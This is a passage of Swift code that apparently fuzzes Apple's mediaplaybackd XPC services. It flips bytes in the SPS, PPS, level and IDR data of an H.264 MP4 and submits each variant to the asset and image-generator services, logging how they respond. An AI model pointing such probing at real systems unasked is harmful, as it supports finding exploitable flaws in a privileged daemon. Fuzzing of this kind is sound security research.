                if bytes[i] == t[0] && bytes[i+1] == t[1] && bytes[i+2] == t[2] && bytes[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }
        func be32(_ p: Int) -> Int {
            guard p + 4 <= bytes.count else { return 0 }
            return (Int(bytes[p]) << 24) | (Int(bytes[p+1]) << 16) | (Int(bytes[p+2]) << 8) | Int(bytes[p+3])
        }
        func hex(_ from: Int, _ n: Int) -> String {
            var s = ""
            for k in 0..<n where from + k < bytes.count { s += String(format: "%02x", bytes[from + k]) }
            return s
        }

        // Sample description fourcc and avcC configuration.
        if let a1 = findTag("avc1") {
            emit("xhm: avc1 at \(a1 - 4) sampleEntryFourcc=avc1")
            let w = (Int(bytes[a1 + 28]) << 8) | Int(bytes[a1 + 29])
            let h = (Int(bytes[a1 + 30]) << 8) | Int(bytes[a1 + 31])
            emit("xhm: avc1 width=\(w) height=\(h)")
        }
        var lengthSize = 4
        if let c = findTag("avcC") {
            lengthSize = Int(bytes[c + 8] & 3) + 1
            emit("xhm: avcC at \(c - 4) head=\(hex(c + 4, 12)) lengthSize=\(lengthSize)")
            let numSPS = Int(bytes[c + 9] & 0x1F)
            emit("xhm: avcC numSPS=\(numSPS)")
            var p = c + 10
            for k in 0..<min(numSPS, 2) {
                guard p + 2 <= bytes.count else { break }
                let len = (Int(bytes[p]) << 8) | Int(bytes[p+1])
                emit("xhm: sps[\(k)] len=\(len)")
                p += 2 + max(len, 0)
            }
            if p < bytes.count {
                let numPPS = Int(bytes[p])
                emit("xhm: avcC numPPS=\(numPPS)")
                p += 1
                for k in 0..<min(numPPS, 2) {
                    guard p + 2 <= bytes.count else { break }
                    let len = (Int(bytes[p]) << 8) | Int(bytes[p+1])
                    emit("xhm: pps[\(k)] len=\(len)")
                    p += 2 + max(len, 0)
                }
            }
        }

        guard let stco = findTag("stco"), let stsz = findTag("stsz") else { emit("xhm: no tables"); return }
        let offset = be32(stco + 12)
        let uniform = be32(stsz + 8)
        let size = uniform != 0 ? uniform : be32(stsz + 16)
        guard offset > 0, size > 8, offset + size <= bytes.count else { emit("xhm: bad range"); return }
        emit("xhm: first sample offset=\(offset) size=\(size) lengthSize=\(lengthSize)")

        var pos = 0
        var count = 0
        while pos + lengthSize <= size && count < 10 {
            var len = 0
            for k in 0..<lengthSize { len = (len << 8) | Int(bytes[offset + pos + k]) }
            if len <= 0 || pos + lengthSize + len > size { break }
            let type = Int(bytes[offset + pos + lengthSize] & 0x1F)
            emit("xhm: nal[\(count)] rel=\(pos) len=\(len) type=\(type)")
            pos += lengthSize + len
            count += 1
        }
        emit("xhm: mapped=\(count) consumed=\(pos)/\(size)")

        if let stss = findTag("stss") {
            let n = be32(stss + 8)
            var list = ""
            for k in 0..<min(n, 8) { list += "\(be32(stss + 12 + k * 4)) " }
            emit("xhm: stss count=\(n) samples=\(list)")
        }
        emit("xhm: done")
    }

    func h264CampaignProbe() {
        emit("xhc: H.264 mutation campaign")
        guard let mp4 = Bundle.main.url(forResource: "h264-main", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xhc: sample missing"); return
        }
        var bytes = [UInt8](original)
        func findTag(_ tag: String) -> Int? {
            let t = Array(tag.utf8)
            var i = 4
            while i + 4 <= bytes.count {
                if bytes[i] == t[0] && bytes[i+1] == t[1] && bytes[i+2] == t[2] && bytes[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }
        func be32(_ p: Int) -> Int {
            guard p + 4 <= bytes.count else { return 0 }
            return (Int(bytes[p]) << 24) | (Int(bytes[p+1]) << 16) | (Int(bytes[p+2]) << 8) | Int(bytes[p+3])
        }
        guard let stco = findTag("stco"), let stsz = findTag("stsz"), let avcC = findTag("avcC") else {
            emit("xhc: tables missing"); return
        }
        let offset = be32(stco + 12)
        let uniform = be32(stsz + 8)
        let size = uniform != 0 ? uniform : be32(stsz + 16)
        guard offset > 0, size > 8, offset + size <= bytes.count else { emit("xhc: bad range"); return }

        // avcC layout from box start (avcC-4): +8 version, +9 profile, +10 compat,
        // +11 level, +12 lengthSizeMinusOne, +13 numSPS, +14 SPS length...
        let cfg = avcC - 4
        let spsLen = (Int(bytes[avcC + 10]) << 8) | Int(bytes[avcC + 11])
        let spsStart = avcC + 12
        var ppsLen = 0, ppsStart = 0
        if spsStart + spsLen + 1 < bytes.count {
            ppsLen = (Int(bytes[spsStart + spsLen + 1]) << 8) | Int(bytes[spsStart + spsLen + 2])
            ppsStart = spsStart + spsLen + 3
        }
        emit("xhc: spsLen=\(spsLen) spsStart=\(spsStart) ppsLen=\(ppsLen) ppsStart=\(ppsStart) level=\(bytes[cfg + 11])")

        // IDR NAL inside the first sample.
        var idrRel = -1, idrLen = 0
        var pos = 0
        while pos + 4 <= size {
            let len = (Int(bytes[offset + pos]) << 24) | (Int(bytes[offset + pos + 1]) << 16)
                    | (Int(bytes[offset + pos + 2]) << 8) | Int(bytes[offset + pos + 3])
            if len <= 0 || pos + 4 + len > size { break }
            let type = Int(bytes[offset + pos + 4] & 0x1F)
            if type == 5 { idrRel = pos; idrLen = len; break }
            pos += 4 + len
        }
        guard idrRel >= 0 else { emit("xhc: no IDR"); return }
        let idrBase = offset + idrRel + 4
        emit("xhc: idr rel=\(idrRel) len=\(idrLen)")

        func rnd(_ s: inout UInt64) -> UInt64 {
            s = s &* 6364136223846793005 &+ 1442695040888963407
            return s >> 33
        }
        func build(_ kind: String) -> Data? {
            var d = bytes
            switch kind {
            case "baseline":
                break
            case "sps_tail":
                guard spsLen > 4 else { return nil }
                d[spsStart + spsLen - 1] ^= 0xFF
            case "sps_mid":
                guard spsLen > 8 else { return nil }
                d[spsStart + spsLen / 2] ^= 0xFF
            case "pps_tail":
                guard ppsLen > 1 else { return nil }
                d[ppsStart + ppsLen - 1] ^= 0xFF
            case "level":
                d[cfg + 11] = 0xFF
            case "idr_hdr":
                d[idrBase] ^= 0xFF
            case "idr_body8":
                var s: UInt64 = 71
                for _ in 0..<8 { d[idrBase + 2 + Int(rnd(&s) % UInt64(idrLen - 2))] ^= 0xFF }
            case "idr_body128":
                var s: UInt64 = 72
                for _ in 0..<128 { d[idrBase + 2 + Int(rnd(&s) % UInt64(idrLen - 2))] ^= 0xFF }
            case "idr_tail16":
                for k in 0..<16 { d[idrBase + idrLen - 16 + k] ^= 0xFF }
            case "idr_zero":
                for k in 0..<(idrLen + 4) { d[offset + idrRel + k] = 0 }
            default:
                return nil
            }
            return Data(d)
        }

        func cmTime(_ value: Int64, _ scale: Int32) -> XObj? {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in for (i, x) in raw.enumerated() { b[i] = x } }
            withUnsafeBytes(of: scale.littleEndian) { raw in for (i, x) in raw.enumerated() { b[8 + i] = x } }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in for (i, x) in raw.enumerated() { b[12 + i] = x } }
            return b.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
        }

        let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        gotFrame.pointee = false; gotFail.pointee = false

        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                let d = self.describe(e)
                if d.contains("AIGDidGenerateCGImage") { gotFrame.pointee = true }
                if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        for kind in ["baseline", "sps_tail", "sps_mid", "pps_tail", "level",
                     "idr_hdr", "idr_body8", "idr_body128", "idr_tail16", "idr_zero"] {
            guard let payload = build(kind) else { emit("xhc: [\(kind)] build failed"); continue }
            gotFrame.pointee = false; gotFail.pointee = false
            guard let (ac, atok) = open("asset") else { emit("xhc: [\(kind)] asset conn failed"); continue }
            var assetOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
                payload.withUnsafeBytes { raw in
                    if let dd = xq_data_create(raw.baseAddress, raw.count) {
                        "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                        xq_release(dd)
                    }
                }
                "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
                "FormatIdentifier".withCString { k in
                    "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
                }
                if let opts = xq_dictionary_create(nil, nil, 0) {
                    ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                    xq_release(opts)
                }
                if let r = sendSync(ac, m, timeout: 10.0) {
                    assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(m)
            }
            guard assetOID != 0 else { emit("xhc: [\(kind)] no asset"); xq_release(ac); continue }
            guard let (gc, gtok) = open("assetimagegenerator") else { xq_release(ac); continue }
            var genOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 10.0) {
                    genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            var reqText = "skipped"
            if genOID != 0, let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
                if let t = cmTime(0, 24000) {
                    "ImageTime".withCString { xq_dictionary_set_value(m, $0, t) }
                    xq_release(t)
                }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 12.0) {
                    reqText = String(".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) })
                    xq_release(r)
                } else {
                    reqText = "none"
                }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 1.8)
            emit("xhc: [\(kind)] req=\(reqText) frame=\(gotFrame.pointee) failed=\(gotFail.pointee)")
            xq_cancel(gc); xq_release(gc)
            xq_cancel(ac); xq_release(ac)
            Thread.sleep(forTimeInterval: 0.3)
        }
        gotFrame.deallocate(); gotFail.deallocate()
        emit("xhc: done")
    }

    func avcDiffProbe() {
        emit("xad: avcC vs FormatDescriptionArray diff")
        guard let mp4 = Bundle.main.url(forResource: "h264-main", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xad: sample missing"); return
        }
        var bytes = [UInt8](original)
        func findTag(_ tag: String) -> Int? {
            let t = Array(tag.utf8)
            var i = 4
            while i + 4 <= bytes.count {
                if bytes[i] == t[0] && bytes[i+1] == t[1] && bytes[i+2] == t[2] && bytes[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }
        func be32(_ p: Int) -> Int {
            guard p + 4 <= bytes.count else { return 0 }
            return (Int(bytes[p]) << 24) | (Int(bytes[p+1]) << 16) | (Int(bytes[p+2]) << 8) | Int(bytes[p+3])
        }
        guard let avcC = findTag("avcC") else { emit("xad: no avcC"); return }
        let cfg = avcC - 4
        let spsLen = (Int(bytes[avcC + 10]) << 8) | Int(bytes[avcC + 11])
        let spsStart = avcC + 12
        var ppsLen = 0, ppsStart = 0
        if spsStart + spsLen + 1 < bytes.count {
            ppsLen = (Int(bytes[spsStart + spsLen + 1]) << 8) | Int(bytes[spsStart + spsLen + 2])
            ppsStart = spsStart + spsLen + 3
        }

        func build(_ kind: String) -> Data? {
            var d = bytes
            switch kind {
            case "baseline_a", "baseline_b":
                break
            case "sps_tail":
                guard spsLen > 4 else { return nil }
                d[spsStart + spsLen - 1] ^= 0xFF
            case "sps_mid":
                guard spsLen > 8 else { return nil }
                d[spsStart + spsLen / 2] ^= 0xFF
            case "level":
                d[cfg + 11] = 0xFF
            case "pps_tail":
                guard ppsLen > 1 else { return nil }
                d[ppsStart + ppsLen - 1] ^= 0xFF
            default:
                return nil
            }
            return Data(d)
        }
        func fnv(_ p: UnsafePointer<UInt8>, _ n: Int) -> UInt64 {
            var h: UInt64 = 0xcbf29ce484222325
            for i in 0..<n { h ^= UInt64(p[i]); h = h &* 0x100000001b3 }
            return h
        }
        func cmTime(_ value: Int64, _ scale: Int32) -> XObj? {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in for (i, x) in raw.enumerated() { b[i] = x } }
            withUnsafeBytes(of: scale.littleEndian) { raw in for (i, x) in raw.enumerated() { b[8 + i] = x } }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in for (i, x) in raw.enumerated() { b[12 + i] = x } }
            return b.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
        }

        var baseBytes = [UInt8]()
        let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)

        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                let d = self.describe(e)
                if d.contains("AIGDidGenerateCGImage") { gotFrame.pointee = true }
                if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        for kind in ["baseline_a", "baseline_b", "sps_tail", "sps_mid", "level", "pps_tail"] {
            guard let payload = build(kind) else { emit("xad: [\(kind)] build failed"); continue }
            gotFrame.pointee = false; gotFail.pointee = false
            guard let (ac, atok) = open("asset") else { emit("xad: [\(kind)] asset conn failed"); continue }
            var assetOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
                payload.withUnsafeBytes { raw in
                    if let dd = xq_data_create(raw.baseAddress, raw.count) {
                        "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                        xq_release(dd)
                    }
                }
                "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
                "FormatIdentifier".withCString { k in
                    "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
                }
                if let opts = xq_dictionary_create(nil, nil, 0) {
                    ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                    xq_release(opts)
                }
                if let r = sendSync(ac, m, timeout: 10.0) {
                    assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(m)
            }
            guard assetOID != 0 else { emit("xad: [\(kind)] no asset"); xq_release(ac); continue }

            if let s = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x6c6f6431) }
                ".Token".withCString { xq_dictionary_set_int64(s, $0, atok) }
                ".objectID".withCString { xq_dictionary_set_uint64(s, $0, assetOID) }
                ".PropertyName".withCString { k in
                    "assetProperty_Tracks".withCString { v in xq_dictionary_set_string(s, k, v) }
                }
                if let r = sendSync(ac, s, timeout: 8.0) { xq_release(r) }
                xq_release(s)
            }
            Thread.sleep(forTimeInterval: 0.9)
            let trackOID = assetOID &+ 256

            var fda: [UInt8] = []
            if let s = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x54637079) }
                ".Token".withCString { xq_dictionary_set_int64(s, $0, atok) }
                ".objectID".withCString { xq_dictionary_set_uint64(s, $0, trackOID) }
                ".PropertyName".withCString { k in
                    "FormatDescriptionArray".withCString { v in xq_dictionary_set_string(s, k, v) }
                }
                if let r = sendSync(ac, s, timeout: 6.0) {
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    if e == 0, let v = ".Value".withCString({ xq_dictionary_get_value(r, $0) }),
                       let p = xq_data_bytes(v) {
                        let n = xq_data_len(v)
                        fda = [UInt8](repeating: 0, count: n)
                        for i in 0..<n { fda[i] = p[i] }
                    }
                    xq_release(r)
                }
                xq_release(s)
            }
            if kind == "baseline_a" { baseBytes = fda }

            var diffCount = -1, firstDiff = -1
            if !baseBytes.isEmpty && !fda.isEmpty {
                let n = min(baseBytes.count, fda.count)
                diffCount = 0
                for i in 0..<n where baseBytes[i] != fda[i] {
                    diffCount += 1
                    if firstDiff < 0 { firstDiff = i }
                }
                diffCount += abs(baseBytes.count - fda.count)
            }

            guard let (gc, gtok) = open("assetimagegenerator") else { xq_release(ac); continue }
            var genOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 10.0) {
                    genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            if genOID != 0, let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
                if let t = cmTime(0, 24000) {
                    "ImageTime".withCString { xq_dictionary_set_value(m, $0, t) }
                    xq_release(t)
                }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 12.0) { xq_release(r) }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 1.8)

            var fnvText = "n/a"
            if !fda.isEmpty {
                fnvText = String(format: "%016llx", fnv(fda, fda.count))
            }
            emit("xad: [\(kind)] id=\(assetOID) len=\(fda.count) fnv=\(fnvText) diff=\(diffCount) first=\(firstDiff) frame=\(gotFrame.pointee) failed=\(gotFail.pointee)")

            xq_cancel(gc); xq_release(gc)
            xq_cancel(ac); xq_release(ac)
            Thread.sleep(forTimeInterval: 0.3)
        }
        gotFrame.deallocate(); gotFail.deallocate()
        emit("xad: done")
    }

    func ppsProbe() {
        emit("xpp: per-byte PPS mutations")
        guard let mp4 = Bundle.main.url(forResource: "h264-main", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xpp: sample missing"); return
        }
        var bytes = [UInt8](original)
        func findTag(_ tag: String) -> Int? {
            let t = Array(tag.utf8)
            var i = 4
            while i + 4 <= bytes.count {
                if bytes[i] == t[0] && bytes[i+1] == t[1] && bytes[i+2] == t[2] && bytes[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }
        guard let avcC = findTag("avcC") else { emit("xpp: no avcC"); return }
        let spsLen = (Int(bytes[avcC + 10]) << 8) | Int(bytes[avcC + 11])
        let spsStart = avcC + 12
        guard spsStart + spsLen + 3 < bytes.count else { emit("xpp: bad avcC"); return }
        let ppsLen = (Int(bytes[spsStart + spsLen + 1]) << 8) | Int(bytes[spsStart + spsLen + 2])
        let ppsStart = spsStart + spsLen + 3
        emit("xpp: ppsStart=\(ppsStart) ppsLen=\(ppsLen)")

        func build(_ index: Int) -> Data? {
            guard index < ppsLen else { return nil }
            var d = bytes
            d[ppsStart + index] ^= 0xFF
            return Data(d)
        }
        func fnv(_ p: UnsafePointer<UInt8>, _ n: Int) -> UInt64 {
            var h: UInt64 = 0xcbf29ce484222325
            for i in 0..<n { h ^= UInt64(p[i]); h = h &* 0x100000001b3 }
            return h
        }
        func cmTime(_ value: Int64, _ scale: Int32) -> XObj? {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in for (i, x) in raw.enumerated() { b[i] = x } }
            withUnsafeBytes(of: scale.littleEndian) { raw in for (i, x) in raw.enumerated() { b[8 + i] = x } }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in for (i, x) in raw.enumerated() { b[12 + i] = x } }
            return b.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
        }

        var baseBytes = [UInt8]()
        let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)

        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                let d = self.describe(e)
                if d.contains("AIGDidGenerateCGImage") { gotFrame.pointee = true }
                if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        // -1 means baseline.
        for index in [-1, 0, 1, 2, 3, 4] {
            let label = index < 0 ? "baseline" : "pps_b\(index)"
            let payload: Data
            if index < 0 { payload = original } else if let b = build(index) { payload = b } else { continue }
            gotFrame.pointee = false; gotFail.pointee = false
            guard let (ac, atok) = open("asset") else { emit("xpp: [\(label)] asset conn failed"); continue }
            var assetOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
                payload.withUnsafeBytes { raw in
                    if let dd = xq_data_create(raw.baseAddress, raw.count) {
                        "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                        xq_release(dd)
                    }
                }
                "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
                "FormatIdentifier".withCString { k in
                    "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
                }
                if let opts = xq_dictionary_create(nil, nil, 0) {
                    ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                    xq_release(opts)
                }
                if let r = sendSync(ac, m, timeout: 10.0) {
                    assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(m)
            }
            guard assetOID != 0 else { emit("xpp: [\(label)] no asset"); xq_release(ac); continue }

            if let s = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x6c6f6431) }
                ".Token".withCString { xq_dictionary_set_int64(s, $0, atok) }
                ".objectID".withCString { xq_dictionary_set_uint64(s, $0, assetOID) }
                ".PropertyName".withCString { k in
                    "assetProperty_Tracks".withCString { v in xq_dictionary_set_string(s, k, v) }
                }
                if let r = sendSync(ac, s, timeout: 8.0) { xq_release(r) }
                xq_release(s)
            }
            Thread.sleep(forTimeInterval: 0.9)
            let trackOID = assetOID &+ 256

            var fda: [UInt8] = []
            if let s = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x54637079) }
                ".Token".withCString { xq_dictionary_set_int64(s, $0, atok) }
                ".objectID".withCString { xq_dictionary_set_uint64(s, $0, trackOID) }
                ".PropertyName".withCString { k in
                    "FormatDescriptionArray".withCString { v in xq_dictionary_set_string(s, k, v) }
                }
                if let r = sendSync(ac, s, timeout: 6.0) {
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    if e == 0, let v = ".Value".withCString({ xq_dictionary_get_value(r, $0) }),
                       let p = xq_data_bytes(v) {
                        let n = xq_data_len(v)
                        fda = [UInt8](repeating: 0, count: n)
                        for i in 0..<n { fda[i] = p[i] }
                    }
                    xq_release(r)
                }
                xq_release(s)
            }
            if index < 0 { baseBytes = fda }

            var diffCount = -1, firstDiff = -1
            if !baseBytes.isEmpty && !fda.isEmpty {
                let n = min(baseBytes.count, fda.count)
                diffCount = 0
                for i in 0..<n where baseBytes[i] != fda[i] {
                    diffCount += 1
                    if firstDiff < 0 { firstDiff = i }
                }
                diffCount += abs(baseBytes.count - fda.count)
            }

            guard let (gc, gtok) = open("assetimagegenerator") else { xq_release(ac); continue }
            var genOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 10.0) {
                    genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            if genOID != 0, let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
                if let t = cmTime(0, 24000) {
                    "ImageTime".withCString { xq_dictionary_set_value(m, $0, t) }
                    xq_release(t)
                }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 12.0) { xq_release(r) }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 1.8)
            var fnvText = "n/a"
            if !fda.isEmpty { fnvText = String(format: "%016llx", fnv(fda, fda.count)) }
            emit("xpp: [\(label)] len=\(fda.count) fnv=\(fnvText) diff=\(diffCount) first=\(firstDiff) frame=\(gotFrame.pointee) failed=\(gotFail.pointee)")
            xq_cancel(gc); xq_release(gc)
            xq_cancel(ac); xq_release(ac)
            Thread.sleep(forTimeInterval: 0.3)
        }
        gotFrame.deallocate(); gotFail.deallocate()
        emit("xpp: done")
    }

    func spsByteProbe() {
        emit("xss: per-byte SPS mutations")
        guard let mp4 = Bundle.main.url(forResource: "h264-main", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xss: sample missing"); return
        }
        var bytes = [UInt8](original)
        func findTag(_ tag: String) -> Int? {
            let t = Array(tag.utf8)
            var i = 4
            while i + 4 <= bytes.count {
                if bytes[i] == t[0] && bytes[i+1] == t[1] && bytes[i+2] == t[2] && bytes[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }
        guard let avcC = findTag("avcC") else { emit("xss: no avcC"); return }
        let spsLen = (Int(bytes[avcC + 10]) << 8) | Int(bytes[avcC + 11])
        let spsStart = avcC + 12
        emit("xss: spsStart=\(spsStart) spsLen=\(spsLen)")

        func build(_ index: Int) -> Data? {
            guard index < spsLen else { return nil }
            var d = bytes
            d[spsStart + index] ^= 0xFF
            return Data(d)
        }
        func fnv(_ p: UnsafePointer<UInt8>, _ n: Int) -> UInt64 {
            var h: UInt64 = 0xcbf29ce484222325
            for i in 0..<n { h ^= UInt64(p[i]); h = h &* 0x100000001b3 }
            return h
        }
        func cmTime(_ value: Int64, _ scale: Int32) -> XObj? {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in for (i, x) in raw.enumerated() { b[i] = x } }
            withUnsafeBytes(of: scale.littleEndian) { raw in for (i, x) in raw.enumerated() { b[8 + i] = x } }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in for (i, x) in raw.enumerated() { b[12 + i] = x } }
            return b.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
        }

        var baseBytes = [UInt8]()
        let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)

        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
